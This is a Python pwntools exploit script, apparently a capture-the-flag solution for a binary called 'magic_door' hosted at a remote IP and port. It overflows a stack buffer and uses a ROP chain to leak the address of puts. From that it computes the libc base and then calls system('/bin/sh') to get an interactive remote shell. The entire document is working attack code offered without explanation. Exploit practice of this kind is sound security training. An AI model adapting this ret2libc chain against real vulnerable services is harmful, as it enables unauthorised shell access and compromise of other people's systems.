#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./magic_door", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc 13.229.222.125 33160"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
io = start()

pop_rdi = 0x00401434
ret = pop_rdi + 1

payload = b"A" * 0x40
payload += flat(
    elf.bss(0xc00),
    pop_rdi, elf.got["puts"],
    elf.plt["puts"],
    elf.sym["main"]
)

io.sendlineafter(b"open? ", b"50015a")
io.sendlineafter(b"go? ", payload)

io.recvline()
puts_leak = u64(io.recv(6).ljust(8, b"\x00"))
log.info(f"{puts_leak=:#x}")
libc.address = puts_leak - libc.sym["puts"]

payload = b"A" * 0x40
payload += flat(
    elf.bss(0xc00),
    pop_rdi, next(libc.search(b"/bin/sh\x00")),
    pop_rdi + 1,
    libc.sym["system"]
)

io.sendlineafter(b"open? ", b"50015a")
io.sendlineafter(b"go? ", payload)

io.interactive()
